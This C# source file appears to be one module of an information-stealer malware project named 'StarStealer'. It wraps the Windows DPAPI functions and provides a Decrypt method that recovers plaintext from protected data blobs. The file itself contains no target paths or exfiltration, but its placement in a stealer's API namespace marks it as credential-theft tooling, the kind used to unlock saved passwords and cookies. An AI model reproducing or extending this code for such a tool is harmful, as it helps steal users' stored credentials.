using System;
using System.ComponentModel;
using System.Runtime.InteropServices;

namespace StarStealer.APIs
{
	internal class Dp
	{
		[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
		internal struct DATA_BLOB
		{
			public int cbData;

			public IntPtr pbData;
		}

		[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
		internal struct CRYPTPROTECT_PROMPTSTRUCT
		{
			private int cbSize;

			private int dwPromptFlags;

			private IntPtr hwndApp;

			private string szPrompt;

			public int CbSize
			{
				get
				{
					return cbSize;
				}
				set
				{
					cbSize = value;
				}
			}

			public int DwPromptFlags
			{
				get
				{
					return dwPromptFlags;
				}
				set
				{
					dwPromptFlags = value;
				}
			}

			public IntPtr HwndApp
			{
				get
				{
					return hwndApp;
				}
				set
				{
					hwndApp = value;
				}
			}

			public string SzPrompt
			{
				get
				{
					return szPrompt;
				}
				set
				{
					szPrompt = value;
				}
			}
		}

		[DllImport("crypt32.dll", CharSet = CharSet.Auto, SetLastError = true)]
		private static extern bool CryptProtectData(ref DATA_BLOB pPlainText, string szDescription, ref DATA_BLOB pEntropy, IntPtr pReserved, ref CRYPTPROTECT_PROMPTSTRUCT pPrompt, int dwFlags, ref DATA_BLOB pCipherText);

		[DllImport("crypt32.dll", CharSet = CharSet.Auto, SetLastError = true)]
		private static extern bool CryptUnprotectData(ref DATA_BLOB pCipherText, ref string pszDescription, ref DATA_BLOB pEntropy, IntPtr pReserved, ref CRYPTPROTECT_PROMPTSTRUCT pPrompt, int dwFlags, ref DATA_BLOB pPlainText);

		public static byte[] Decrypt(byte[] cipherTextBytes, byte[] entropyBytes, out string description)
		{
			DATA_BLOB pPlainText = default(DATA_BLOB);
			DATA_BLOB pCipherText = default(DATA_BLOB);
			DATA_BLOB pEntropy = default(DATA_BLOB);
			CRYPTPROTECT_PROMPTSTRUCT pPrompt = default(CRYPTPROTECT_PROMPTSTRUCT);
			pPrompt.CbSize = Marshal.SizeOf(typeof(CRYPTPROTECT_PROMPTSTRUCT));
			pPrompt.DwPromptFlags = 0;
			pPrompt.HwndApp = IntPtr.Zero;
			pPrompt.SzPrompt = null;
			description = string.Empty;
			try
			{
				try
				{
					if (cipherTextBytes == null)
					{
						cipherTextBytes = new byte[0];
					}
					pCipherText.pbData = Marshal.AllocHGlobal(cipherTextBytes.Length);
					if (pCipherText.pbData == IntPtr.Zero)
					{
						throw new Exception(string.Empty);
					}
					pCipherText.cbData = cipherTextBytes.Length;
					Marshal.Copy(cipherTextBytes, 0, pCipherText.pbData, cipherTextBytes.Length);
				}
				catch (Exception innerException)
				{
					throw new Exception(string.Empty, innerException);
				}
				try
				{
					if (entropyBytes == null)
					{
						entropyBytes = new byte[0];
					}
					pEntropy.pbData = Marshal.AllocHGlobal(entropyBytes.Length);
					if (pEntropy.pbData == IntPtr.Zero)
					{
						throw new Exception(string.Empty);
					}
					pEntropy.cbData = entropyBytes.Length;
					Marshal.Copy(entropyBytes, 0, pEntropy.pbData, entropyBytes.Length);
				}
				catch (Exception innerException2)
				{
					throw new Exception(string.Empty, innerException2);
				}
				int dwFlags = 1;
				if (!CryptUnprotectData(ref pCipherText, ref description, ref pEntropy, IntPtr.Zero, ref pPrompt, dwFlags, ref pPlainText))
				{
					int lastWin32Error = Marshal.GetLastWin32Error();
					throw new Exception(string.Empty, new Win32Exception(lastWin32Error));
				}
				byte[] array = new byte[pPlainText.cbData];
				Marshal.Copy(pPlainText.pbData, array, 0, pPlainText.cbData);
				return array;
			}
			catch (Exception innerException3)
			{
				throw new Exception(string.Empty, innerException3);
			}
			finally
			{
				if (pPlainText.pbData != IntPtr.Zero)
				{
					Marshal.FreeHGlobal(pPlainText.pbData);
				}
				if (pCipherText.pbData != IntPtr.Zero)
				{
					Marshal.FreeHGlobal(pCipherText.pbData);
				}
				if (pEntropy.pbData != IntPtr.Zero)
				{
					Marshal.FreeHGlobal(pEntropy.pbData);
				}
			}
		}
	}
}
